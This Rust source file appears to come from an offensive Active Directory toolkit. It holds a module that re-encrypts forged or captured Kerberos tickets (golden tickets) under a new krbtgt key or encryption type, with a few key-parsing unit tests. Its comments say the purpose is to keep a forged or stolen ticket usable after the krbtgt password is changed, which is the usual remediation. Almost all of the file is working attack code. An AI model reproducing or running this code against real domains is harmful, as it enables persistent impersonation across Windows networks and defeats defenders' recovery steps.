//! Ticket encryption rotation -- re-encrypt an existing forged or captured
//! Kerberos ticket under a different krbtgt key without rebuilding the ticket.
//!
//! This is useful when:
//! - The krbtgt account password was changed and an old ticket needs to be
//!   rotated to the new key to remain usable.
//! - You want to change the ticket's encryption type (e.g. RC4 -> AES256)
//!   while preserving the PAC and metadata.

use kerberos_asn1::{Asn1Object, EncTicketPart, EncryptedData, KrbCred, Ticket};
use kerberos_crypto::new_kerberos_cipher;
use overthrone_core::error::{OverthroneError, Result};
use tracing::info;

use crate::golden::{build_krb_cred, etype_name};

/// Result of a ticket rotation operation.
#[derive(Debug, Clone)]
pub struct RotatedTicket {
    /// Raw KRB-CRED (.kirbi) bytes.
    pub kirbi: Vec<u8>,
    /// Old encryption type numeric value.
    pub old_etype: i32,
    /// New encryption type numeric value.
    pub new_etype: i32,
    /// Path where the rotated ticket was saved (if any).
    pub output_path: Option<String>,
}

/// Parse a hex-encoded krbtgt key and infer the encryption type.
fn parse_key(key_hex: &str) -> Result<(Vec<u8>, i32)> {
    let key = hex::decode(key_hex.trim())
        .map_err(|e| OverthroneError::TicketForge(format!("Invalid key hex: {e}")))?;
    let etype = match key.len() {
        16 => overthrone_core::proto::kerberos::ETYPE_RC4_HMAC,
        32 => overthrone_core::proto::kerberos::ETYPE_AES256_CTS,
        _ => {
            return Err(OverthroneError::TicketForge(format!(
                "krbtgt key must be 16 (RC4) or 32 (AES256) bytes, got {}",
                key.len()
            )));
        }
    };
    Ok((key, etype))
}

/// Re-encrypt a Kerberos ticket under a new krbtgt key.
///
/// # Arguments
/// * `kirbi` - Raw .kirbi (KRB-CRED) bytes.
/// * `old_key_hex` - Hex-encoded current krbtgt key used to decrypt the ticket.
/// * `new_key_hex` - Hex-encoded krbtgt key to re-encrypt with.
///
/// # Returns
/// `RotatedTicket` containing the new .kirbi bytes and metadata.
pub fn rotate_ticket_encryption(
    kirbi: &[u8],
    old_key_hex: &str,
    new_key_hex: &str,
) -> Result<RotatedTicket> {
    let (old_key, old_etype) = parse_key(old_key_hex)?;
    let (new_key, new_etype) = parse_key(new_key_hex)?;

    if old_etype != new_etype {
        info!(
            "[rotate] Changing encryption type {} -> {}",
            etype_name(old_etype),
            etype_name(new_etype)
        );
    } else {
        info!(
            "[rotate] Re-encrypting ticket with same etype {} under new key",
            etype_name(old_etype)
        );
    }

    let krb_cred = KrbCred::parse(kirbi)
        .map_err(|e| OverthroneError::TicketForge(format!("Parse KRB-CRED: {e}")))?
        .1;

    let ticket = krb_cred
        .tickets
        .first()
        .ok_or_else(|| OverthroneError::TicketForge("KRB-CRED has no tickets".into()))?
        .clone();

    let cred_info = if krb_cred.enc_part.etype == 0 || krb_cred.enc_part.etype == 23 {
        kerberos_asn1::EncKrbCredPart::parse(&krb_cred.enc_part.cipher)
            .ok()
            .and_then(|(_, enc)| enc.ticket_info.into_iter().next())
    } else {
        None
    };

    let old_cipher = new_kerberos_cipher(old_etype)
        .map_err(|e| OverthroneError::TicketForge(format!("Old cipher: {e}")))?;

    let decrypted = old_cipher
        .decrypt(&old_key, 2, &ticket.enc_part.cipher)
        .map_err(|e| {
            OverthroneError::TicketForge(format!(
                "Failed to decrypt ticket with old key (etype={}): {e}",
                etype_name(old_etype)
            ))
        })?;

    let (_, enc_ticket) = EncTicketPart::parse(&decrypted)
        .map_err(|e| OverthroneError::TicketForge(format!("Parse EncTicketPart: {e}")))?;

    let new_cipher = new_kerberos_cipher(new_etype)
        .map_err(|e| OverthroneError::TicketForge(format!("New cipher: {e}")))?;
    let re_encrypted = new_cipher.encrypt(&new_key, 7, &enc_ticket.build());

    let new_ticket = Ticket {
        tkt_vno: ticket.tkt_vno,
        realm: ticket.realm,
        sname: ticket.sname,
        enc_part: EncryptedData {
            etype: new_etype,
            kvno: ticket.enc_part.kvno,
            cipher: re_encrypted,
        },
    };

    let session_key = cred_info
        .as_ref()
        .map(|c| c.key.keyvalue.clone())
        .unwrap_or_default();

    let kirbi_bytes = build_krb_cred(&new_ticket, &enc_ticket, &session_key, new_etype)?;

    Ok(RotatedTicket {
        kirbi: kirbi_bytes,
        old_etype,
        new_etype,
        output_path: None,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_key_rejects_invalid_hex() {
        assert!(parse_key("zz").is_err());
    }

    #[test]
    fn parse_key_accepts_rc4() {
        let (k, et) = parse_key("0123456789abcdef0123456789abcdef").unwrap();
        assert_eq!(k.len(), 16);
        assert_eq!(et, overthrone_core::proto::kerberos::ETYPE_RC4_HMAC);
    }

    #[test]
    fn parse_key_accepts_aes256() {
        let key = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        let (k, et) = parse_key(key).unwrap();
        assert_eq!(k.len(), 32);
        assert_eq!(et, overthrone_core::proto::kerberos::ETYPE_AES256_CTS);
    }

    #[test]
    fn parse_key_rejects_bad_length() {
        assert!(parse_key("0123456789abcdef0123456789abcdef01").is_err());
    }
}
